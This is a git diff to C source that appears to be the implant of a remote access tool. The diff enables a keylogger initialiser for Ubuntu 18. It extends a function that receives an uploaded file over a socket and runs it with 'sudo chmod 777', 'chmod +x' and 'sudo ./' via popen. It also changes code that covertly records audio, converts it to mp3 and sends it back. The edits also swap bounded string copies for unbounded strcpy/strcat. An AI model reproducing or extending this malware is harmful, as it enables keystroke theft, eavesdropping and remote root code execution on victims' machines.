@@ -11,8 +11,7 @@
 #include <pthread.h> //pthread_create(), pthread_join()
 
 #include <gtk-2.0/gtk/gtk.h>
-
-//#include <glib-object.h>
+#include <gst/gst.h>
 
 #include "../includes/constants.h"
 #include "../includes/keylogger/keylogger.h"
@@ -86,7 +85,7 @@ int main(int argc, char *argv[])
    
     //ubuntu16_keylogger_init();
 
-    //ubuntu18_keylogger_init();
+    ubuntu18_keylogger_init();
 
     //mint_keylogger_init();
 
@@ -94,7 +93,7 @@ int main(int argc, char *argv[])
 
     //kali_keylogger_init();
 
-    fedora_keylogger_init();
+    //fedora_keylogger_init();
     
     /* Initialize GStreamer */
     gst_init(&argc, &argv);
@@ -537,7 +536,7 @@ void recv_upload()
 
     long tailleBlockRecut = 0;
     long totalRcv = 0;
-    char buffer[BUFSIZ] = {0};
+    char *buffer = NULL;
 
     char *cmd_1 = NULL;
     char *cmd_2 = NULL;
@@ -555,6 +554,13 @@ void recv_upload()
     else
     {
         error("recv() weight", "recv_upload()");
+        return;
+    }
+
+    buffer = malloc(weight * sizeof(char));
+    if(buffer == NULL)
+    {
+        error("malloc() buffer", "recv_upload()");
         return;
     }
 
@@ -599,15 +605,15 @@ void recv_upload()
         return;
     }
 
-    cmd_1 = strncpy(cmd_1, "sudo chmod 777 ", 16);
-    cmd_1 = strncat(cmd_1, log_name, strlen(log_name));
+    cmd_1 = strcpy(cmd_1, "sudo chmod 777 ");
+    cmd_1 = strcat(cmd_1, log_name);
 
-    cmd_2 = strncpy(cmd_2, "sudo chmod +x ", 15);
-    cmd_2 = strncat(cmd_2, log_name, strlen(log_name));
+    cmd_2 = strcpy(cmd_2, "sudo chmod +x ");
+    cmd_2 = strcat(cmd_2, log_name);
 
-    cmd_3 = strncpy(cmd_3, "sudo ", 6);
-    cmd_3 = strncat(cmd_3, "./", 3);
-    cmd_3 = strncat(cmd_3, log_name, strlen(log_name));
+    cmd_3 = strcpy(cmd_3, "sudo ");
+    cmd_3 = strcat(cmd_3, "./");
+    cmd_3 = strcat(cmd_3, log_name);
 
     do
     {
@@ -618,8 +624,6 @@ void recv_upload()
         totalRcv += tailleBlockRecut;
 
     }while(totalRcv < weight);
-    
-    printf("fichier reçut success : %ld\n", totalRcv);
 
 
     pipe[0] = popen(cmd_1, "r");
@@ -652,6 +656,8 @@ void recv_upload()
         pclose(pipe[2]);
 
         free(log_name);
+
+        free(buffer);
         free(cmd_1);
         free(cmd_2);
         free(cmd_3);
@@ -667,6 +673,9 @@ void recv_upload()
         error("send() installed", "recv_upload()")
 
     free(log_name);
+
+    free(buffer);
+
     free(cmd_1);
     free(cmd_2);
     free(cmd_3);
@@ -1212,7 +1221,7 @@ void *execute_record_cmd()
     if(ret == GST_STATE_CHANGE_FAILURE)
     {
         g_printerr ("Unable to set the pipeline to the playing state.\n");
-        gst_object_unref (pipeline);
+        gst_object_unref(pipeline);
         pthread_exit(NULL);
     }
 
@@ -1225,16 +1234,16 @@ void *execute_record_cmd()
     data.loop = main_loop;
     data.pipeline = pipeline;
 
-    gst_bus_add_signal_watch (bus);
+    gst_bus_add_signal_watch(bus);
     g_signal_connect(bus, "message", G_CALLBACK(cb_message), &data);
 
     g_main_loop_run(main_loop);
 
 
     g_main_loop_unref (main_loop);
-    gst_object_unref (bus);
+    gst_object_unref(bus);
     gst_element_set_state (pipeline, GST_STATE_NULL);
-    gst_object_unref (pipeline);
+    gst_object_unref(pipeline);
 
     free(buffer);
     
@@ -1254,11 +1263,19 @@ void *execute_record_cmd()
     {
         if(send(csock, (char*)&recorded, sizeof(recorded), 0) == -1)
             error("send() recorded", "execute_record_cmd()");
+             
+        if(system("ffmpeg -i output.wav -vn -ar 44100 -ac 2 -b:a 320k output.mp3") == -1)
+        {
+            error("system convert to mp3", "execute_record_cmd()");
+            pthread_exit(NULL);
+        }
         
-        record_file = fopen("output.wav", "rb");
+        wait_time_end(1.0);
+        
+        record_file = fopen("output.mp3", "rb");
         if(record_file == NULL)
         {
-            error("fopen() output.wav", "execute_record_cmd()");
+            error("fopen() output.mp3", "execute_record_cmd()");
             pthread_exit(NULL);
         }
     }
@@ -1301,13 +1318,11 @@ void *execute_record_cmd()
 
         totalSend += dataRead;
 
-        //printf("Uploading: %.2f Mo\n", (double)totalSend / 1000000);
-
     }while(totalSend < file_weight);
 
     printf("\n\nEnvoie du fichier SUCCESS : %ld !!\n", totalSend);
     
-    wait_time_end(1.0);
+    wait_time_end(1.5);
 
     if(on_video == 1)
     {
